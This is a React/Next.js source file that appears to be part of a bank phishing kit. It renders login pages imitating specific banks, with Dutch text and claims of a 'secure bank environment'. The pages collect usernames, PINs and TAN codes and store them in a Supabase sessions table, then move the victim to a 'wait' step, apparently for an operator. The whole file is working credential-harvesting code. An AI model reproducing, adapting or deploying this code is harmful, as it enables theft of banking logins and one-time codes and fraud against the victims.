"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { DemoShell } from "@/components/demo/DemoShell";
import type { BankTheme } from "@/lib/bank-theme-config";
import { getBankTheme } from "@/lib/bank-theme-config";
import { normalizeBankCredentialPayload, normalizeBankLoginFields } from "@/lib/bank-page-adapter";
import { stepToPath } from "@/lib/session-routes";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { DEFAULT_DESIGN_CONFIG, BlockType } from "@/lib/bank-design-schema";

type Props = {
  sessionId: string;
  bankSlug: string;
  bank: any;
};

export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const [theme, setTheme] = useState<BankTheme | null>(null);

  const [verfuegernummer, setVerfuegernummer] = useState("");
  const [pin, setPin] = useState("");
  const [tacCode, setTacCode] = useState("");
  const [saving, setSaving] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      const nextTheme = await getBankTheme(bankSlug);
      if (!cancelled) setTheme(nextTheme);
    })();
    return () => {
      cancelled = true;
    };
  }, [bankSlug]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setVerfuegernummer(fd.verfuegernummer ?? "");
      setPin(fd.pin ?? "");
      setTacCode(fd.tacCode ?? "");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit(e?: React.FormEvent) {
    if (e) e.preventDefault();
    if (!supabase || !sessionId || !bank) return;
    setSaving(true);
    setError(null);

    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    const normalizedFields = normalizeBankLoginFields({ verfuegernummer, pin, tacCode });
    const credentials = normalizeBankCredentialPayload({
      bankSlug: bank.slug,
      bankName: bank.name,
      ...normalizedFields,
    });
    const { error: updateError } = await supabase
      .from("sessions")
      .update({
        current_step: "wait",
        form_data: {
          ...prev,
          ...credentials,
        },
      })
      .eq("id", sessionId);

    setSaving(false);
    if (updateError) {
      setError("Eingaben konnten nicht uebermittelt werden. Bitte erneut versuchen.");
      return;
    }
    router.replace(stepToPath("wait", sessionId));
  }

  if (!supabase) {
    return (
      <DemoShell title="Bankinlog">
        <ConfigMissing />
      </DemoShell>
    );
  }

  if (!bank) {
    return (
      <DemoShell title="Bankinlog">
        <p className="rounded-xl border border-amber-200 bg-amber-50 p-4 text-center text-sm">
          Onbekende bank. Start de selectie opnieuw.
        </p>
      </DemoShell>
    );
  }

  // YENİ DİNAMİK YAPISAL ŞEMA VARSA ONU KULLAN
  if (bank.design) {
    const design = bank.design;
    
    const renderBlock = (block: BlockType) => {
      switch (block) {
        case "header":
          if (!design.header.show) return null;
          return (
            <header 
              key="header"
              style={{ 
                backgroundColor: design.header.backgroundColor, 
                height: design.header.height,
                padding: design.header.padding,
                display: 'flex',
                alignItems: 'center',
                justifyContent: design.header.logoAlignment === 'center' ? 'center' : design.header.logoAlignment === 'right' ? 'flex-end' : 'flex-start'
              }}
            >
              {bank.logoFile ? (
                <img src={bank.logoFile} alt={bank.name} style={{ maxHeight: '100%', maxWidth: '200px', objectFit: 'contain' }} />
              ) : (
                <div style={{ fontSize: '24px', fontWeight: 'bold', color: design.typography.headerColor }}>{bank.logo}</div>
              )}
            </header>
          );
        
        case "form":
          return (
            <div key="form" style={{ display: 'flex', justifyContent: design.formBox.alignment === 'center' ? 'center' : design.formBox.alignment === 'right' ? 'flex-end' : 'flex-start', padding: '2rem' }}>
              <div 
                style={{
                  backgroundColor: design.formBox.backgroundColor,
                  color: design.formBox.textColor,
                  borderRadius: design.formBox.borderRadius,
                  boxShadow: design.formBox.boxShadow !== 'none' ? '0 10px 25px -5px rgba(0, 0, 0, 0.1)' : 'none',
                  padding: design.formBox.padding,
                  width: design.formBox.width,
                  maxWidth: '100%',
                  fontFamily: design.typography.fontFamily
                }}
              >
                <h2 style={{ fontSize: '24px', fontWeight: 'bold', color: design.typography.headerColor, marginBottom: '0.5rem' }}>{design.texts.title}</h2>
                <p style={{ fontSize: '15px', color: design.typography.bodyColor, marginBottom: '2rem' }}>{design.texts.subtitle}</p>
                
                <form onSubmit={handleSubmit}>
                  <div style={{ marginBottom: '1rem' }}>
                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Gebruikersnaam</label>
                    <input required value={verfuegernummer} onChange={e => setVerfuegernummer(e.target.value)} type="text" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Uw gebruikersnaam" />
                  </div>
                  <div style={{ marginBottom: '1.5rem' }}>
                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Wachtwoord</label>
                    <input required value={pin} onChange={e => setPin(e.target.value)} type="password" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Uw wachtwoord" />
                  </div>
                  
                  {error && <p style={{ color: '#ef4444', fontSize: '14px', marginBottom: '1rem' }}>{error}</p>}
                  
                  <button 
                    type="submit"
                    disabled={saving}
                    style={{
                      width: '100%',
                      backgroundColor: design.button.backgroundColor,
                      color: design.button.textColor,
                      padding: design.button.padding,
                      borderRadius: design.button.borderRadius,
                      fontWeight: design.button.fontWeight as any,
                      border: 'none',
                      cursor: saving ? 'not-allowed' : 'pointer',
                      opacity: saving ? 0.7 : 1
                    }}
                  >
                    {saving ? "Laden..." : design.texts.title}
                  </button>
                </form>
              </div>
            </div>
          );
  
        case "footer":
          return (
            <footer key="footer" style={{ padding: '2rem', textAlign: 'center', marginTop: 'auto' }}>
              <div style={{ display: 'flex', justifyContent: 'center', gap: '2rem', flexWrap: 'wrap' }}>
                {design.texts.footerLinks.map((link: string, i: number) => (
                  <a key={i} href="#" style={{ color: design.typography.linkColor, fontSize: '14px', textDecoration: 'none' }}>{link}</a>
                ))}
              </div>
            </footer>
          );
  
        case "spacer":
          return <div key={Math.random()} style={{ flexGrow: 1, minHeight: '2rem' }}></div>;
          
        default:
          return null;
      }
    };
  
    return (
      <div 
        style={{
          minHeight: '100vh',
          display: 'flex',
          flexDirection: 'column',
          backgroundColor: design.background.type === 'color' ? design.background.value : 'transparent',
          backgroundImage: design.background.type === 'image' ? `url(${design.background.value})` : 'none',
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          fontFamily: design.typography.fontFamily
        }}
      >
        {design.blocks.map((block: BlockType) => renderBlock(block))}
      </div>
    );
  }

  // ESKİ FALLBACK TASARIM (Dinamik şema yoksa çalışır)
  if (!theme) {
    return (
      <DemoShell title={`${bank.name} inloggen`} subtitle="Even geduld...">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-zinc-300 border-t-zinc-600" />
        </div>
      </DemoShell>
    );
  }

  return (
    <DemoShell title={`${bank.name} inloggen`} subtitle="Bevestig je bankgegevens om verder te gaan.">
      <div className="app-panel overflow-hidden rounded-2xl">
        <div
          className="flex items-center justify-between px-5 py-4 text-white"
          style={{ backgroundColor: theme.colors.primary, color: theme.colors.textOnPrimary }}
        >
          <div className="flex items-center gap-3">
            <div
              className="grid h-10 min-w-10 place-items-center rounded-md px-2 text-xs font-bold tracking-wide"
              style={{ backgroundColor: theme.colors.secondary, color: theme.colors.textOnPrimary }}
            >
              {theme.logoText}
            </div>
            <div>
              <p className="text-xs uppercase tracking-widest opacity-80">Veilige Bankomgeving</p>
              <h2 className="text-lg font-bold">{bank.name}</h2>
            </div>
          </div>
        </div>

        <form
          onSubmit={(e) => {
            e.preventDefault();
            void handleSubmit();
          }}
          className="space-y-4 p-5"
        >
          <label className="block text-sm font-bold text-zinc-800">
            {theme.inputLabels.verfuegernummer}
            <input
              required
              className="app-input mt-1 w-full px-3 py-2"
              value={verfuegernummer}
              onChange={(e) => setVerfuegernummer(e.target.value)}
            />
          </label>

          <label className="block text-sm font-bold text-zinc-800">
            {theme.inputLabels.pin}
            <input
              required
              type="password"
              className="app-input mt-1 w-full px-3 py-2"
              value={pin}
              onChange={(e) => setPin(e.target.value)}
            />
          </label>

          <label className="block text-sm font-bold text-zinc-800">
            {theme.inputLabels.tacCode}
            <input
              required
              inputMode="numeric"
              maxLength={6}
              className="app-input mt-1 w-full px-3 py-2"
              value={tacCode}
              onChange={(e) => setTacCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
            />
          </label>

          {error ? <p className="text-sm text-red-700">{error}</p> : null}

          <button
            type="submit"
            disabled={saving}
            className="app-btn w-full rounded-xl py-3 text-sm disabled:opacity-60"
          >
            {saving ? "Controleren..." : theme.buttonText}
          </button>
        </form>
      </div>
    </DemoShell>
  );
}
